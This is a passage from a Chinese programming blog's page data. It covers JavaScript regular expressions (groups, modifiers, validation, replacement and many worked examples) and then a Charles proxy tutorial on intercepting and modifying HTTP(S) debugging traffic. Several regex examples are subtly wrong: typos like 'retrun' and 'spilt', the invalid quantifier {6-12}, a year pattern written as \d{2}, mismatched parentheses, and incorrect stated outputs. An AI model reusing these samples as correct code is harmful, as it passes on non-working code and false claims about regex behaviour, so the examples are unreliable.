class="line"><span class="keyword">var</span> reg = <span class="regexp">/\b(\w)+\s\1/</span>   <span class="comment">// 匹配两个连续相同的单词</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">'abc abc 123'</span>;</span><br><span class="line">str.replace(<span class="regexp">/(ab)c/g</span>, <span class="string">'$1g'</span>); <span class="comment">// 'abg abg 123'</span></span><br></pre></td></tr></table></figure></p><p><em><code>$&amp;</code></em> 匹配子串文本<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// '2,3,5'变成'222,333,555'</span></span><br><span class="line"><span class="string">"2,3,5"</span>.replace(<span class="regexp">/(\d)+/g</span>, $&amp;$&amp;$&amp;);  <span class="comment">// 222,333,555</span></span><br></pre></td></tr></table></figure></p><p><em><code>(?:regex)</code></em>，如果我们不想子表达式被引用，可以用<strong>非捕获正则</strong>, 这样可以避免浪费内存。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">'scq000'</span>;</span><br><span class="line">str.replace(<span class="regexp">/(scq00)(?:0)/</span>, <span class="string">'$1,$2'</span>);  <span class="comment">// 'scq00,$2'</span></span><br><span class="line"><span class="comment">// 使用了非捕获正则，所以第二个引用没有值，这里直接替换为$2</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-5-逻辑处理"><a href="#1-5-逻辑处理" class="headerlink" title="1.5 逻辑处理"></a>1.5 逻辑处理</h4><table><thead><tr><th>逻辑关系</th><th style="text-align:right">正则表达式</th></tr></thead><tbody><tr><td>与</td><td style="text-align:right">无             </td></tr><tr><td>非</td><td style="text-align:right">[^regex] 和 !  </td></tr><tr><td>或</td><td style="text-align:right">&#124;</td></tr></tbody></table><p><br></p><h4 id="1-6-修饰符"><a href="#1-6-修饰符" class="headerlink" title="1.6 修饰符"></a>1.6 修饰符</h4><p>修饰符放在了<code>/regex/img</code>正则表达式的最后面。</p><table><thead><tr><th>修饰符</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>m</td><td style="text-align:center">多行匹配 multiline</td></tr><tr><td>i</td><td style="text-align:center">忽略大小写 ignore       </td></tr><tr><td>g</td><td style="text-align:center">全局匹配global， 在目标字符串中按顺序找到满足匹配模式的所有子串</td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/ab&#123;2,4&#125;c/g</span></span><br><span class="line"><span class="keyword">var</span> string = <span class="string">"abc abbc abbbc abbbbc abbbbbc"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(string.match(regex));</span><br><span class="line"><span class="comment">// ["abbc", "abbbc", "abbbbc"]</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-正则表达式-JS"><a href="#2-正则表达式-JS" class="headerlink" title="2. 正则表达式 + JS"></a>2. 正则表达式 + JS</h3><p>有了正则表达式进行匹配，结合JS api，我们可以完成验证、切分、提取、替换的动作。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>.search(regex)</span><br><span class="line"><span class="built_in">String</span>.split(regex)</span><br><span class="line"><span class="built_in">String</span>.match(regex)</span><br><span class="line"><span class="built_in">String</span>.replace(regex, newText)</span><br><span class="line"><span class="built_in">RegExp</span>.test(string)</span><br><span class="line"><span class="built_in">RegExp</span>.exec(string)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-1-验证"><a href="#2-1-验证" class="headerlink" title="2.1 验证"></a>2.1 验证</h4><p>判断有没有匹配上<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断一个字符串中有没有数字</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/\d/</span>;</span><br><span class="line"><span class="keyword">var</span> string = <span class="string">"abc123"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最常用的是test</span></span><br><span class="line"><span class="built_in">console</span>.log(regex.test(string));        <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-2-切分"><a href="#2-2-切分" class="headerlink" title="2.2 切分"></a>2.2 切分</h4><p>把目标字符串，切成一段一段 <code>string.split(regex)</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 日期格式切除年月日</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/\D/</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"2017-01-01"</span>.split(regex));  <span class="comment">// ["2017", "01" "01"]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"2017.01.01"</span>.split(regex));  <span class="comment">// ["2017", "01" "01"]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"2017/01/01"</span>.split(regex));  <span class="comment">// ["2017", "01" "01"]</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-3-提取"><a href="#2-3-提取" class="headerlink" title="2.3 提取"></a>2.3 提取</h4><p>提取匹配到的数据<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^(\d&#123;4&#125;)\D(\d&#123;2&#125;)\D(\d&#123;2&#125;))$/</span>;</span><br><span class="line"><span class="keyword">var</span> string = <span class="string">"2017-06-26"</span>;</span><br><span class="line">string.match(regex); </span><br><span class="line"><span class="comment">// [$0, $1, $2 ... , index, input]</span></span><br><span class="line"><span class="comment">//  =&gt;["2017-06-26", "2017", "06", "26", index: 0, input: "2017-06-26"]</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-4-替换"><a href="#2-4-替换" class="headerlink" title="2.4 替换"></a>2.4 替换</h4><p><code>string.replace(regex, newtext)</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将yyyy-mm-dd替换成yyyy/mm/dd</span></span><br><span class="line"><span class="keyword">var</span> string = <span class="string">"2017-06-26"</span>;</span><br><span class="line"><span class="keyword">var</span> today = <span class="keyword">new</span> <span class="built_in">Date</span>( string.replace(<span class="regexp">/\-/g</span>, <span class="string">"/"</span>))</span><br><span class="line"><span class="built_in">console</span>.log(today)  <span class="comment">// =&gt; Mon Jun 26 2017 00:00:00 GMT+0800 (中国标准时间)</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-匹配原理"><a href="#3-匹配原理" class="headerlink" title="3. 匹配原理"></a>3. 匹配原理</h3><h4 id="3-1-回溯"><a href="#3-1-回溯" class="headerlink" title="3.1 回溯"></a>3.1 回溯</h4><p>后补</p><h4 id="3-2-操作符优先级"><a href="#3-2-操作符优先级" class="headerlink" title="3.2 操作符优先级"></a>3.2 操作符优先级</h4><p>优先级从上至下，由高到低</p><ul><li>转义符 \</li><li>括号和方括号 (…)、(?:…)、(?=…)、(?!…)、[…]</li><li>量词限定符 {m}、{m,n}、{m,}、?、*、+</li><li>位置和序列 ^ 、$、 \元字符、 一般字符</li><li>管道符（竖杠）|</li></ul><h4 id="3-3-优化效率"><a href="#3-3-优化效率" class="headerlink" title="3.3 优化效率"></a>3.3 优化效率</h4><p>后补</p><p><br></p><h3 id="4-例子"><a href="#4-例子" class="headerlink" title="4. 例子"></a>4. 例子</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/hello/</span>;</span><br><span class="line">regex.test(<span class="string">"hello"</span>);  </span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/ab&#123;1,2&#125;c/g</span>;</span><br><span class="line"><span class="string">"abc abbc abbbc"</span>.match(regex); </span><br><span class="line"><span class="comment">// ["abc", "abbc"]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/a[123]b/g</span>;</span><br><span class="line"><span class="string">"a0b a1b a4b"</span>.match(regex); </span><br><span class="line"><span class="comment">// ["a1b"];</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配2-3位数</span></span><br><span class="line"><span class="comment">// 筛选数组中的三位数 arr.join(" ").match(/d&#123;3&#125;/g)</span></span><br><span class="line"><span class="comment">// 贪婪匹配，尽可能多的匹配</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/\d&#123;2,5&#125;/g</span>;</span><br><span class="line"><span class="string">"123 1234 12356 123456"</span>.match(regex);  </span><br><span class="line"><span class="comment">// ["123", "1234", "1234", "12345"]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 惰性匹配，尽可能少的匹配</span></span><br><span class="line"><span class="comment">// 在量词后面加个问号能实现惰性匹配 &#123;m,n&#125;?   &#123;m,&#125;?   ??   +?  *?  </span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/\d&#123;2,3&#125;?/g</span></span><br><span class="line"><span class="string">"123 1234 12356 123456"</span>.match(regex);  </span><br><span class="line"><span class="comment">// ["12", "12", "34", "12", "34", "12", "34", "56"]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// (p1|p2|p3)分支结构是惰性的，前面的匹配上了，后面的就不再尝试</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/good|goodbye/g</span>;   <span class="comment">// ["good"]</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/goodbye|good/g</span>;   <span class="comment">// ["goodbye"]</span></span><br><span class="line"><span class="string">"goodbye"</span>.match(regex);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配16进制颜色值, [0-9a-fA-F]出现3或6次</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/#([0-9a-fA-F]&#123;3&#125;|[0-9a-fA-F]&#123;6&#125;)/g</span>;;</span><br><span class="line"><span class="keyword">var</span> string = <span class="string">"#ffbbad #FC01df #fff"</span>;  </span><br><span class="line"><span class="comment">// ["#ffbbad","#FC01df","#fff"]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配时间</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^([01][0-9]|[2][0-3]):([0-5][0-9])$/</span>;</span><br><span class="line">regex.test(<span class="string">"23:59"</span>)</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配日期</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^[0-9]&#123;4&#125;-(0[1-9]|1[0-2])-(0[1-9]|[12][0-9]|3[01])$/</span></span><br><span class="line">regex.test(<span class="string">"2019-01-02"</span>);</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 把yyyy-mm-dd格式替换成mm/dd/yyyy</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/(\d&#123;2&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)/</span>;</span><br><span class="line"><span class="string">"2019-01-02"</span>.replace(regex, <span class="string">"$2/$3/$1"</span>);</span><br><span class="line"><span class="comment">// "01/02/2019"， 等价于</span></span><br><span class="line"><span class="keyword">var</span> result = <span class="string">"2019-01-02"</span>.replace(regex, <span class="function"><span class="keyword">function</span>(<span class="params">match, year, month, day</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> month + <span class="string">"/"</span> + day + <span class="string">"/"</span> + year;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配2016-01-02 2016/01/01 2016.01.02三种格式，确保前后分隔符一致</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/\d&#123;4&#125;(-|/</span>|.)\d&#123;<span class="number">2</span>&#125;\<span class="number">1</span>\d&#123;<span class="number">2</span>&#125;/;</span><br><span class="line">regex.test(string);    <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配windows操作系统文件路径</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^[a-zA-Z]:\\([^\\:*&lt;&gt;|"?\r\n/]+\\)*([^\\:*&lt;&gt;|"?\r\n/]+)?$/</span>;</span><br><span class="line"><span class="built_in">console</span>.log( regex.test(<span class="string">"F:\\study\\javascript\\regex\\regular expression.pdf"</span>) ); </span><br><span class="line"><span class="built_in">console</span>.log( regex.test(<span class="string">"F:\\study\\javascript\\regex\\"</span>) ); </span><br><span class="line"><span class="built_in">console</span>.log( regex.test(<span class="string">"F:\\study\\javascript"</span>) ); </span><br><span class="line"><span class="built_in">console</span>.log( regex.test(<span class="string">"F:\\"</span>) ); </span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配id值</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/id=".*"/</span>;      <span class="comment">// id="container" class="main"</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/id="[^"]*"/</span>;   <span class="comment">// id="container"</span></span><br><span class="line"><span class="keyword">var</span> string = <span class="string">'&lt;div id="container" class="main"&gt;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数字千分位分隔符</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/(?!^)(?=(\d&#123;3&#125;)+$)/</span>;</span><br><span class="line"><span class="string">"12345678"</span>.replace(regex, <span class="string">','</span>)  <span class="comment">// 12,345,678</span></span><br><span class="line"><span class="string">"123456789"</span>.replace(regex, <span class="string">','</span>) <span class="comment">// 123,456,789</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 密码 6-12位 多重规则应拆开写</span></span><br><span class="line"><span class="comment">// 1. 同时包含数字和小写字母 </span></span><br><span class="line"><span class="comment">// 2. 同时包含数字和大写字母 </span></span><br><span class="line"><span class="comment">// 3. 同时包含小写字母和大写字母 </span></span><br><span class="line"><span class="comment">// 4. 同时包含数字、小写字母和大写字母</span></span><br><span class="line"><span class="keyword">var</span> regex1 = <span class="regexp">/^[0-9a-z]&#123;6-12&#125;$/</span></span><br><span class="line"><span class="keyword">var</span> regex2 = <span class="regexp">/^[0-9A-Z]&#123;6-12&#125;$/</span></span><br><span class="line"><span class="keyword">var</span> regex3 = <span class="regexp">/^[a-zA-Z]&#123;6-12&#125;$/</span></span><br><span class="line"><span class="keyword">var</span> regex4 = <span class="regexp">/^[0-9a-zA-Z]&#123;6-12&#125;$/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配浮点数</span></span><br><span class="line"><span class="comment">// 10  +10  -10  1.23  +1.23  -1.23  .2  +.2  -.2</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^[+-]?(\d+|\d+\.\d+|.\d+)$/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串trim模拟</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trim</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="regexp">/^\s+|\s+$/g</span>, <span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将每个单词的首字母转为大写</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">titleize</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  retrun str.toLowerCase().replace(<span class="regexp">/(?:^|\s)\w/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c.toUpperCase();</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">titleize(<span class="string">"my name is amy"</span>)   <span class="comment">// "My Name Is Amy"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 驼峰化 </span></span><br><span class="line"><span class="comment">// ?的目的，为了应对str尾部的字符可能不是单词字符 "-moz-transform  "</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">camelize</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="regexp">/[-_\s]+(.)?/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">match, c</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c ? c.toUpperCase() : <span class="string">''</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中划线化</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dasherize</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="regexp">/([A-Z])/g</span>, <span class="string">'-$1'</span>).replace(<span class="regexp">/[-_/s]+/g</span>, <span class="string">'-'</span>).toLowerCase();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// html转义和反转义</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unescapeHTML</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> htmlEntities = &#123;</span><br><span class="line">    lt: <span class="string">'&lt;'</span>,</span><br><span class="line">  gt: <span class="string">'&gt;'</span>,</span><br><span class="line">  nbsp: <span class="string">' '</span>,</span><br><span class="line">  cent: <span class="string">'¢'</span>,</span><br><span class="line">  pound: <span class="string">'£'</span>,</span><br><span class="line">  yen: <span class="string">'¥'</span>,</span><br><span class="line">  euro: <span class="string">'€'</span>,</span><br><span class="line">  copy: <span class="string">'©'</span>,</span><br><span class="line">  reg: <span class="string">'®'</span>,</span><br><span class="line">  quot: <span class="string">'"'</span>,</span><br><span class="line">  amp: <span class="string">'&amp;'</span>,</span><br><span class="line">  apos: <span class="string">'\''</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="regexp">/\(&amp;[^;]+);/</span>, <span class="function"><span class="keyword">function</span>(<span class="params">match, key</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (key <span class="keyword">in</span> htmlEntities) &#123;</span><br><span class="line">      <span class="keyword">return</span> htmlEntities[key]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> match;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">unescapeHTML(<span class="string">'&amp;lt;div&amp;gt;Blah blah blah&amp;lt;/div&amp;gt'</span>); <span class="comment">// "&lt;div&gt;Blah blah blah&lt;/div&gt;"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 符合 成对标签 格式</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/&lt;([^&gt;]+)&gt;[\d\D]*&lt;\/\1&gt;/</span>; </span><br><span class="line">regex.test(<span class="string">"&lt;title&gt;wrong!&lt;/p&gt;"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 保证只有中文</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^[\u4e00-\u9fa5]+$/ig</span>;</span><br><span class="line">regex.test(<span class="string">'中文'</span>) <span class="comment">// true</span></span><br><span class="line">regex.test(<span class="string">'中a'</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="5-没有必要用正则的情况"><a href="#5-没有必要用正则的情况" class="headerlink" title="5. 没有必要用正则的情况"></a>5. 没有必要用正则的情况</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从日期中提取年月日</span></span><br><span class="line"><span class="string">"2017-01-02"</span>.spilt(<span class="string">'-'</span>)   <span class="comment">// ["2017", "01", "02"]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否有问号</span></span><br><span class="line"><span class="string">"123?123"</span>.indexOf(<span class="string">'?'</span>)   <span class="comment">// 3</span></span><br><span class="line"><span class="string">"123"</span>.indexOf(<span class="string">'?'</span>)       <span class="comment">// -1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取子串</span></span><br><span class="line"><span class="string">"JavaScript"</span>.substring(<span class="number">4</span>);</span><br></pre></td></tr></table></figure><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.im/post/5cdcd42551882568651554e6" target="_blank" rel="noopener">正则表达式不要背</a></li><li><a href="https://juejin.im/post/5965943ff265da6c30653879" target="_blank" rel="noopener">JS正则表达式完整教程（略长）</a></li></ul>]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Charles抓包</title>
      <link href="/2019/05/27/Charles%E6%8A%93%E5%8C%85/"/>
      <url>/2019/05/27/Charles%E6%8A%93%E5%8C%85/</url>
      <content type="html"><![CDATA[<blockquote><p>Charles将自己设置为系统的网络访问代理服务器，这样所有的网络请求都会通过它，从而实现了网络请求的截获和分析。</p></blockquote><p><br></p><h3 id="1-过滤网络请求"><a href="#1-过滤网络请求" class="headerlink" title="1. 过滤网络请求"></a>1. 过滤网络请求</h3><p>选择菜单中的Proxy -&gt; Mac OS X Proxy，之后你的电脑上的任何网络请求都可以在请求面板中看到。</p><ul><li>Structure: 将所有网络请求按照域名划分</li><li>Sequence: 将所有网络请求按照时间排序</li><li>filter: 过滤网络请求。想看所有来自<code>www.baidu.com</code>的所有网络请求，在下面你输入baidu即可。<br><br><br><img src="/2019/05/27/Charles抓包/1.png" style="max-width:500px"></li></ul><p><br><br><br></p><h3 id="2-截取https数据"><a href="#2-截取https数据" class="headerlink" title="2. 截取https数据"></a>2. 截取https数据</h3><p>捕获https协议的网络请求，需要安装Charles的CA证书。</p><p>点击顶部菜单栏Help -&gt; SSL Proxying -&gt; Install Charles Root Certificate -&gt; 在keychain处将新安装的证书设置为永久信任。即使安装了CA证书，charles默认是不捕获https协议的网络请求。我们需要选中网络请求右击选中 <em>SSL Proxying Enabled</em>，这样才能看到。<br><br><br><img src="/2019/05/27/Charles抓包/5.png" style="max-width:500px"></p><p><br><br><br></p><h3 id="3-截获iPhone的网络请求"><a href="#3-截获iPhone的网络请求" class="headerlink" title="3. 截获iPhone的网络请求"></a>3. 截获iPhone的网络请求</h3><p>要截获iphone的网络请求需要为Charles开启代理功能。在菜单栏选择Proxy -&gt; Proxy Settings，填写HTTP Proxy, Port:8888。并将Enable transparent HTTP proxying勾选上。</p><p><em>iphone上的设置</em><br>打开手机“设置 - 无线局域网”，点击“配置代理”，设置HTTP代理选中“手动”。服务器处填写电脑ip地址，端口写8888。<br><br><br><img src="/2019/05/27/Charles抓包/2.png" style="max-width:200px"></p><p><br></p><h3 id="4-修改网络请求"><a href="#4-修改网络请求" class="headerlink" title="4. 修改网络请求"></a>4. 修改网络请求</h3><p>Charles提供了对网络请求的编辑和重发功能。只要选中需要修改编辑的网络请求，点击 <em>钢笔</em> 按钮，点击后就可以对网络请求进行编辑，编辑后点击 <em>Execute</em> 按钮，该请求就能被执行。<br><br><br><img src="/2019/05/27/Charles抓包/3.png" style="max-width: 500px"><br><br></p><h3 id="5-修改服务器返回内容"><a href="#5-修改服务器返回内容" class="headerlink" title="5. 修改服务器返回内容"></a>5. 修改服务器返回内容</h3><p>为了调试代码，很多时候我们需要修改接口返回的数据。制造数据为空、数据异常、请求失败、多页数据的情况。下面的功能，都可以实现修改服务端返回数据的功能。</p><ul><li>Map 功能适合长期地将某一请求重定向到另一个指定的网络地址或本地json文件</li><li>Rewrite 功能适合对网络请求进行一些正则替换</li><li>Breakpoints 功能适合对网络请求进行一些临时性的修改（类似断点作用）</li></ul><p><br></p><h4 id="5-1-Map"><a href="#5-1-Map" class="headerlink" title="5.1 Map"></a>5.1 Map</h4><p>点击菜单栏Tools -&gt; Map Remote，适合切换线上到本地，测试服到正式服的场景<br>点击菜单栏Tools -&gt; Map Local，映射到本地的json文件</p><p><br></p><h3 id="6-压力测试"><a href="#6-压力测试" class="headerlink" title="6. 压力测试"></a>6. 压力测试</h3><p>使用Charles的Repeat功能可以对服务器发起并发访问进行压力测试。选中某个网络请求 -&gt; 右击 -&gt; Repeat Advanced -&gt; 设置迭代次数(iterations)和并发数(Concurrency) -&gt; 点击ok。</p><p><br></p><h3 id="7-反向代理"><a href="#7-反向代理" class="headerlink" title="7. 反向代理"></a>7. 反向代理</h3><p>反向代理允许我们将本地指定端口的请求映射到远程的另一个端口上。点击顶部菜单栏Proxy -&gt; 点击 Reverse Proxies。将本地的8080端口映射到远程的80端口上，当我访问本地的80端口，实际返回的就是远程80端口的提供的内容。</p><p><br></p><h3 id="8-charles抓不到localhost"><a href="#8-charles抓不到localhost" class="headerlink" title="8. charles抓不到localhost"></a>8. 